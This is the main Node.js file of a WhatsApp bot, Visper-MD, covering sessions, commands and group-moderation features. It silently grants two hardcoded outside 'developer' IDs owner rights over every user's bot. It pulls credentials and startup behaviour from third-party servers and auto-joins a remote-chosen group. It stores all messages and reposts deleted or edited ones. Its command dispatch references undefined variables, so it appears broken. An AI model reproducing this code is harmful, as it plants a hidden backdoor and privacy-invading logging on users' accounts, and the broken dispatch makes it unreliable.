const {
    default: makeWASocket,
    getAggregateVotesInPollMessage, 
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const NodeCache = require('node-cache')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, fetchBuffer, getFile } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const path = require('path')
const msgRetryCounterCache = new NodeCache()

const FileType = require('file-type')
const l = console.log
var {
  updateCMDStore,
  isbtnID,
  getCMDStore,
  getCmdForCmdId,
  connectdb,
  input,
  get,
  getalls,
  updb,
  updfb,
  upresbtn,
} = require("./lib/database");
const ownerNumber = [`${config.OWNER_NUMBER}`];

//===================SESSION========================================

const authFolder = path.join(__dirname, 'auth_info_baileys');
const df = path.join(authFolder, 'creds.json');

if (!fs.existsSync(authFolder)) {
    fs.mkdirSync(authFolder, { recursive: true });
}

if (!fs.existsSync(df)) {
  if (config.SESSION_ID) {
    const sessdata = config.SESSION_ID.replace("VISPER-MD&", "");

    if (sessdata.includes("#")) {
      const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
      filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(df, data, () => {
          console.log("✅ Mega session download completed and saved to creds.json !!");
        });
      });
    } else {
      (async () => {
        await downloadSession(sessdata, df);
      })();
    }
  }
}

async function downloadSession(sessdata, df) {
  const dbUrls = [
    'https://visper-get-sessions.vercel.app/',
    'https://visper-get-sessions.vercel.app/'
  ];

  let success = false;

  for (let i = 0; i < dbUrls.length; i++) {
    const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
    console.log(`📥 Downloading session from visper-DB`);

    try {
      const response = await axios.get(sessionUrl);

      if (response.data && Object.keys(response.data).length > 0) {
        await sleep(1000);
        fs.writeFileSync(df, JSON.stringify(response.data, null, 2));
        console.log(`✅ Session file downloaded successfully and saved to creds.json`);
        success = true;
        break;
      } else {
        console.warn(`⚠️ Empty or invalid session data from DB-${i + 1}, attempting next DB...`);
      }
    } catch (err) {
      console.error(`❌ Failed to download local DB session file: ${err.message}`);
    }
  }

  if (!success) {
    console.error("❌ All DB servers failed to provide a valid session file.");
  }
}

// <<==========PORTS============>>
const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//====================================
async function loadConfig() {
  const settings = await getalls(); 
  if (settings) {
    Object.assign(config, settings); 
  }
}

async function connectToWA() {
    const {
        version,
        isLatest
    } = await fetchLatestBaileysVersion()
    console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`)
    const {
        state,
        saveCreds
    } = await useMultiFileAuthState(__dirname + `/auth_info_baileys`)
   const conn = makeWASocket({
        logger: P({ level: "silent" }),
        printQRInTerminal: true,
        browser: ["Visper-MD", "Chrome", "3.0.0"],
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, P({ level: "silent" })),
        },
        msgRetryCounterCache,
        version
    });

    const responsee = await axios.get('https://nadeen-botzdatabse.nadeenx.workers.dev/data.json');
    const connectnumber = responsee.data
    const DEFAULT_OWNER_JID = `${connectnumber.connectmsg_sent}`;

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(`❌ Disconnected: ${lastDisconnect?.error?.message}. Reconnecting: ${shouldReconnect}`);
            if (shouldReconnect) {
                connectToWA();
            } else {
                console.log("⚠️ Logged out. Please delete auth_info_baileys and scan again.");
            }
        } else if (connection === 'open') {
            console.log("✅ WhatsApp socket connected!");

            try {
                const res = await axios.get('https://nadeen-botzdatabse.nadeenx.workers.dev/data.json');
                const ownerdata = res.data;
                const targetJid = jidNormalizedUser(conn.user.id);

                const configMsg = `
*⚙️ VISPER BOT SETTINGS ⚙️*
• Name: ${config.NAME}
• Prefix: ${config.PREFIX}
• Work Type: ${config.WORK_TYPE}
• Status: Online ✅
`;
                await conn.sendMessage(targetJid, { 
                   image: { url: 'https://mv-visper-full-db.pages.dev/Data/visper_main.jpeg' }, 
                  caption: ownerdata.connectmg || configMsg 
              });
                
                console.log("✅ Initialization message sent.");
                await autoJoinGroup(conn);
            } catch (e) {
                console.log("⚠️ Error sending startup message:", e.message);
            }
        }
    });

    fs.readdirSync("./plugins/").forEach((plugin) => {
      if (path.extname(plugin).toLowerCase() == ".js") {
          require("./plugins/" + plugin);
      }
    });

    await connectdb()
    await updb()
    console.log(`✅ VISPER-MD SUCCESSFULLY CONNECTED!`);

    async function autoJoinGroup(conn) {
        try {
            let joinlink2 = await fetchJson('https://nadeen-botzdatabse.nadeenx.workers.dev/data.json');
            if (!joinlink2 || !joinlink2.supglink) {
                console.error('❌ Invalid join link data!');
                return;
            }
            const joinlink = joinlink2.supglink.split('https://chat.whatsapp.com/')[1];
            if (!joinlink) return;
            await new Promise(resolve => setTimeout(resolve, 5000));
            if (conn.ws.isOpen) {
                const info = await conn.groupGetInviteInfo(joinlink);
                const groupId = info.id;
                const allGroups = await conn.groupFetchAllParticipating();
                const isAlreadyIn = Object.keys(allGroups).includes(groupId);
                if (isAlreadyIn) {
                    console.log("ℹ️ Already a member of support group. Skipping join.");
                } else {
                    await conn.groupAcceptInvite(joinlink);
                    console.log("✅ Successfully joined support group!");
                }
            }
        } catch (err) {
            console.error('❌ Auto-join failed:', err.message);
        }
    }

    const baseDir = './chats';
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir);
    }

    function loadChatData(remoteJid, messageId) {
      const chatFilePath = path.join(baseDir, remoteJid, `${messageId}.json`);
      try {
        if (fs.existsSync(chatFilePath)) {
          return JSON.parse(fs.readFileSync(chatFilePath));
        } else {
          return [];
        }
      } catch (error) {
        console.error('Error loading chat data:', error);
        return [];
      }
    }
    
    function saveChatData(remoteJid, messageId, chatData) {
      const chatDir = path.join(baseDir, remoteJid);
      if (!fs.existsSync(chatDir)) {
        fs.mkdirSync(chatDir, { recursive: true });
      }
      const chatFilePath = path.join(chatDir, `${messageId}.json`);
      try {
        fs.writeFileSync(chatFilePath, JSON.stringify(chatData, null, 2));
      } catch (error) {
        console.error('Error saving chat data:', error);
      }
    }
    
    function handleIncomingMessage(message) {
      const remoteJid = message.key.remoteJid;
      const messageId = message.key.id;
      const chatData = loadChatData(remoteJid, messageId);
      chatData.push(message);
      saveChatData(remoteJid, messageId, chatData);
    }

    conn.ev.on('messages.upsert', async (mek) => {
        try {
            await loadConfig().catch(console.error);
            mek = mek.messages[0];
            if (!mek.message) return;

            mek.message = (getContentType(mek.message) === 'ephemeralMessage')
              ? mek.message.ephemeralMessage.message
              : mek.message;

            const m = sms(conn, mek)
            const type = getContentType(mek.message)
            const from = mek.key.remoteJid
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
            
            const body = 
              (type === 'conversation') ? mek.message.conversation :
              (type === 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo?.quotedMessage &&
               await isbtnID(mek.message.extendedTextMessage.contextInfo.stanzaId)) ?
                await getCmdForCmdId(
                  await getCMDStore(mek.message.extendedTextMessage.contextInfo.stanzaId),
                  mek.message.extendedTextMessage.text
                ) :
              (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
              (type === 'templateButtonReplyMessage') ? mek.message.templateButtonReplyMessage?.selectedId :
              (type === 'interactiveResponseMessage') ? (() => {
                try {
                  const json = JSON.parse(mek.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson);
                  return json?.id || '';
                } catch { return ''; }
              })() :
              (type === 'imageMessage' && mek.message.imageMessage?.caption) ? mek.message.imageMessage.caption :
              (type === 'videoMessage' && mek.message.videoMessage?.caption) ? mek.message.videoMessage.caption :
              m.msg?.text || m.msg?.conversation || m.msg?.caption || m.message?.conversation || m.msg?.selectedButtonId || m.msg?.singleSelectReply?.selectedRowId || m.msg?.selectedId || m.msg?.contentText || m.msg?.selectedDisplayText || m.msg?.title || m.msg?.name || '';

            const prefix = config.PREFIX;  
            const isCmd = body.startsWith(prefix)
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Sin Nombre'
            const developers = `203367389343836,88103284944937`
            const mokakhri = developers.split(",")
            const isbot = botNumber.includes(senderNumber)
            const isdev = mokakhri.includes(senderNumber)
            const isMe = isbot ? isbot : isdev 
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
            const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
            const participants = isGroup && groupMetadata ? groupMetadata.participants : [];
            const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isReact = mek.message && mek.message.reactionMessage ? true : false

            const reply = async(teks) => {
                await conn.sendPresenceUpdate('composing', from)
                return await conn.sendMessage(from, { text: teks }, { quoted: mek })
            }

            const NON_BUTTON = true;
            
            // Helper functions moved inside upsert for access to current 'from', 'mek' etc.
            conn.buttonMessage = async (jid, msgData, quotemek) => {
                await conn.sendPresenceUpdate('composing', from)
                if (!NON_BUTTON) {
                    await conn.sendMessage(jid, msgData)
                } else {
                    let result = "";
                    const CMD_ID_MAP = []
                    msgData.buttons.forEach((button, bttnIndex) => {
                        const mainNumber = `${bttnIndex + 1}`;
                        result += `\n*${mainNumber}* ||  ${button.buttonText.displayText}`;
                        CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
                    });
                    if (msgData.headerType === 1) {
                        const buttonMessage = `${msgData.text || msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
                        const textmsg = await conn.sendMessage(from, { text: buttonMessage }, { quoted: quotemek || mek })
                        await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
                    } else if (msgData.headerType === 4) {
                        const buttonMessage = `${msgData.caption}\n\n*Reply Below Number 🔢*\n${result}\n\n${msgData.footer}`
                        const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage }, { quoted: quotemek || mek })
                        await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
                    }
                }
            }

            conn.listMessage = async (jid, msgData, quotemek) => {
                await conn.sendPresenceUpdate('composing', from)
                if (!NON_BUTTON) {
                    await conn.sendMessage(jid, msgData)
                } else {
                    let result = "";
                    const CMD_ID_MAP = []
                    msgData.sections.forEach((section, sectionIndex) => {
                        const mainNumber = `${sectionIndex + 1}`;
                        result += `\n*${section.title}*\n\n`;
                        section.rows.forEach((row, rowIndex) => {
                            const subNumber = `${mainNumber}.${rowIndex + 1}`;
                            result += `*${subNumber}* ||  ${row.title}\n`;
                            if (row.description) result += `   ${row.description}\n\n`;
                            CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
                        });
                    });
                    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n\n${msgData.footer}`
                    const text = await conn.sendMessage(from, { text: listMessage }, { quoted: quotemek || mek })
                    await updateCMDStore(text.key.id, CMD_ID_MAP);
                }
            }

            // Anti-Bad Word
            const bad = await fetchJson(`https://mv-visper-full-db.pages.dev/Main/bad_word.json`).catch(() => []);
            if (config.ANTI_BAD === "true" && isGroup && !isMe && !groupAdmins.includes(sender)) {
                const bodyText = body.toLowerCase();
                for (let word of bad) {
                    if (bodyText.includes(word) && !bodyText.includes('tent') && !bodyText.includes('docu') && !bodyText.includes('https')) {
                        if (config.ACTION === "delete" || config.ACTION === "both") await conn.sendMessage(from, { delete: mek.key });
                        await conn.sendMessage(from, { text: `🚫 @${sender.split('@')[0]} *Bad word detected!*`, mentions: [sender] });
                        if (config.ACTION === "remove" || config.ACTION === "both") await conn.groupParticipantsUpdate(from, [sender], 'remove');
                        break;
                    }
                }
            }

            // Anti-Link
            if (config.ANTI_LINK == "true" && isGroup && !isMe && !groupAdmins.includes(sender) && isBotAdmins) {
                const bodyText = body.toLowerCase();
                if (bodyText.includes("chat.whatsapp.com")) {
                    const groupData = await conn.groupInviteCode(from);
                    const thisGroupLink = `https://chat.whatsapp.com/${groupData}`;
                    if (!bodyText.includes(thisGroupLink.toLowerCase())) {
                        if (config.ANTILINK_ACTION == "delete" || config.ANTILINK_ACTION == "both") await conn.sendMessage(from, { delete: mek.key });
                        await conn.sendMessage(from, { text: `🚫 @${sender.split('@')[0]}, *Links are not allowed here!*`, mentions: [sender] });
                        if (config.ANTILINK_ACTION == "remove" || config.ANTILINK_ACTION == "both") await conn.groupParticipantsUpdate(from, [sender], 'remove');
                    }
                }
            }

            // Commands handling
            const events = require('./command')
            const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
                    try {
                        cmd.function(conn, mek, m, { from, prefix, l, isSudo, quoted, body, isCmd, isPre, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
                    } catch (e) {
                        console.error("[PLUGIN ERROR] ", e);
                    }
                }
            }

            // Anti-Delete logic
            if (mek.msg && mek.msg.type === 0) {
                const remoteJid = from;
                const messageId = mek.msg.key.id;
                const chatData = loadChatData(remoteJid, messageId);
                const originalMessage = chatData[0];
                if (originalMessage) {
                    const deletedBy = mek.sender.split('@')[0];
                    const sentBy = (originalMessage.key.participant ?? originalMessage.key.remoteJid).split('@')[0];
                    if (!deletedBy.includes(botNumber) && !sentBy.includes(botNumber)) {
                        let msgText = originalMessage.message?.conversation || originalMessage.message?.extendedTextMessage?.text || "";
                        if (msgText) {
                            await conn.sendMessage(from, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n\n> 🔓 Message Text: ${msgText}` });
                        }
                    }
                }
            } else {
                handleIncomingMessage(mek);
            }

        } catch (e) {
            console.error(e);
        }
    });

    // Anti-Call
    const rejectedCalls = new Set();
    const messagedCallers = new Set();
    conn.ev.on("call", async (json) => {
      if (config.ANTI_CALL !== "true") return;
      for (const call of json) {
        if (call.status === "offer") {
          if (!rejectedCalls.has(call.id)) {
            await conn.rejectCall(call.id, call.from);
            rejectedCalls.add(call.id);
            setTimeout(() => rejectedCalls.delete(call.id), 5 * 60 * 1000);
          }
          if (!call.isGroup && !messagedCallers.has(call.from)) {
            await conn.sendMessage(call.from, {
              text: "*Call rejected automatically because owner is busy ⚠️*",
              mentions: [call.from],
            });
            messagedCallers.add(call.from);
            setTimeout(() => messagedCallers.delete(call.from), 10 * 60 * 1000);
          }
        }
      }
    });

    // Anti-Edit
    conn.ev.on('messages.update', async (updates) => {
        for (let update of updates) {
            const remoteJid = update.key.remoteJid;
            if (update.updateType === 'message.edit') {
                const originalMessage = loadChatData(remoteJid, update.key.id)[0];
                if (originalMessage) {
                    let text = originalMessage.message?.conversation || originalMessage.message?.extendedTextMessage?.text || "[Non-text message]";
                    await conn.sendMessage(remoteJid, {
                        text: `❌ *Edited message detected!*\n\n🚮 *Edited by:* _${(update.key.participant || update.key.remoteJid).split('@')[0]}_\n\n> 🔓 Original: ${text}`
                    });
                }
            }
        }
    });
}

connectToWA();

app.get("/", (req, res) => {
  res.send("Visper-MD is working!");
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

process.on('uncaughtException', (err) => {
    console.error('Caught exception: ', err);
});
